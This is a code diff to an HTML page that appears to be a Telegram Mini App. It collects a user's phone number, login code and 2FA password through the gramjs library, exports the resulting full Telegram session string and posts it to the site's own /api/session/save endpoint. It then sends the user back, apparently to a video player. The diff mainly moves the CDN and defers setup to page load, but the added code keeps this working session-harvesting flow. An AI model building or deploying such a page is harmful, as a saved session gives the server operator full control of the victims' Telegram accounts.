@@ -10,7 +10,8 @@
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;800&display=swap" rel="stylesheet" />
   
-  <script src="https://cdn.jsdelivr.net/npm/telegram@2.22.2/browser/bundle.js"></script>
+  <!-- 🚨 THE FIX: Reliable UNPKG CDN -->
+  <script src="https://unpkg.com/telegram@2.22.2/browser/bundle.js"></script>
 
   <style>
     body { background-color: #050509; color: white; font-family: 'Outfit', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
@@ -57,9 +58,6 @@
     if (tg) tg.expand();
     
     const UID = window.Telegram?.WebApp?.initDataUnsafe?.user?.id || 7993892902;
-    const { TelegramClient } = telegram;
-    const { StringSession } = telegram.sessions;
-    
     const apiId = Number("{{ api_id }}"); 
     const apiHash = "{{ api_hash }}";
     
@@ -73,78 +71,89 @@
     const btnVerifyOtp = document.getElementById('btn-verify-otp');
     const btnVerifyPass = document.getElementById('btn-verify-pass');
 
-    client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+    // 🚨 THE FIX: Wait for Window Load
+    window.addEventListener('load', () => {
+        if (typeof window.telegram === 'undefined') {
+            setStatus("Error: Telegram Engine failed to load.");
+            btnSend.disabled = true;
+            return;
+        }
 
-    btnSend.onclick = async () => {
-        btnSend.disabled = true;
-        setStatus("Connecting to Telegram Servers...");
-        
-        currentPhone = document.getElementById('inp-phone').value.replace(/\s/g, '');
-        if (!currentPhone.startsWith('+')) currentPhone = '+' + currentPhone;
+        const { TelegramClient } = window.telegram;
+        const { StringSession } = window.telegram.sessions;
 
-        try {
-            if (!client.connected) await client.connect();
-            setStatus("Requesting OTP...");
-            const result = await client.sendCode({ apiId: apiId, apiHash: apiHash }, currentPhone);
-            phoneCodeHash = result.phoneCodeHash;
+        client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
+
+        btnSend.onclick = async () => {
+            btnSend.disabled = true;
+            setStatus("Connecting to Telegram Servers...");
             
-            document.getElementById('step-phone').classList.add('hidden');
-            document.getElementById('step-otp').classList.remove('hidden');
-            setStatus("✅ OTP sent to your Telegram App!");
-        } catch (err) { 
-            setStatus("❌ Error: " + err.message); 
-            btnSend.disabled = false;
-        }
-    };
+            currentPhone = document.getElementById('inp-phone').value.replace(/\s/g, '');
+            if (!currentPhone.startsWith('+')) currentPhone = '+' + currentPhone;
 
-    btnVerifyOtp.onclick = async () => {
-        btnVerifyOtp.disabled = true;
-        setStatus("Verifying Code...");
-        const code = document.getElementById('inp-otp').value.replace(/\s/g, '');
-        try {
-            await client.signIn(currentPhone, { phoneCodeHash: phoneCodeHash, phoneCode: code });
-            await finalizeLogin();
-        } catch (err) {
-            if (err.message.includes('SESSION_PASSWORD_NEEDED')) {
-                document.getElementById('step-otp').classList.add('hidden');
-                document.getElementById('step-pass').classList.remove('hidden');
-                setStatus("🔒 2FA Password Required");
-            } else { 
+            try {
+                if (!client.connected) await client.connect();
+                setStatus("Requesting OTP...");
+                const result = await client.sendCode({ apiId: apiId, apiHash: apiHash }, currentPhone);
+                phoneCodeHash = result.phoneCodeHash;
+                
+                document.getElementById('step-phone').classList.add('hidden');
+                document.getElementById('step-otp').classList.remove('hidden');
+                setStatus("✅ OTP sent to your Telegram App!");
+            } catch (err) { 
                 setStatus("❌ Error: " + err.message); 
-                btnVerifyOtp.disabled = false;
+                btnSend.disabled = false;
             }
+        };
+
+        btnVerifyOtp.onclick = async () => {
+            btnVerifyOtp.disabled = true;
+            setStatus("Verifying Code...");
+            const code = document.getElementById('inp-otp').value.replace(/\s/g, '');
+            try {
+                await client.signIn(currentPhone, { phoneCodeHash: phoneCodeHash, phoneCode: code });
+                await finalizeLogin();
+            } catch (err) {
+                if (err.message.includes('SESSION_PASSWORD_NEEDED')) {
+                    document.getElementById('step-otp').classList.add('hidden');
+                    document.getElementById('step-pass').classList.remove('hidden');
+                    setStatus("🔒 2FA Password Required");
+                } else { 
+                    setStatus("❌ Error: " + err.message); 
+                    btnVerifyOtp.disabled = false;
+                }
+            }
+        };
+
+        btnVerifyPass.onclick = async () => {
+            btnVerifyPass.disabled = true;
+            setStatus("Checking Password...");
+            const password = document.getElementById('inp-pass').value.trim();
+            try {
+                await client.signInWithPassword({ password: password, apiId: apiId, apiHash: apiHash });
+                await finalizeLogin();
+            } catch (err) { 
+                setStatus("❌ Error: " + err.message); 
+                btnVerifyPass.disabled = false;
+            }
+        };
+
+        async function finalizeLogin() {
+            setStatus("Securing Session Data...");
+            const sessionString = client.session.save();
+            
+            await fetch('/api/session/save', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uid: UID, session: sessionString })
+            });
+
+            setStatus("✅ Authorized! Redirecting...");
+            setTimeout(() => {
+                window.history.back();
+            }, 1000);
         }
-    };
-
-    btnVerifyPass.onclick = async () => {
-        btnVerifyPass.disabled = true;
-        setStatus("Checking Password...");
-        const password = document.getElementById('inp-pass').value.trim();
-        try {
-            await client.signInWithPassword({ password: password, apiId: apiId, apiHash: apiHash });
-            await finalizeLogin();
-        } catch (err) { 
-            setStatus("❌ Error: " + err.message); 
-            btnVerifyPass.disabled = false;
-        }
-    };
-
-    async function finalizeLogin() {
-        setStatus("Securing Session Data...");
-        const sessionString = client.session.save();
-        
-        await fetch('/api/session/save', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid: UID, session: sessionString })
-        });
-
-        setStatus("✅ Authorized! Redirecting...");
-        setTimeout(() => {
-            // Wapas player par redirect kar dega
-            window.history.back();
-        }, 1000);
-    }
+    });
   </script>
 </body>
 </html>
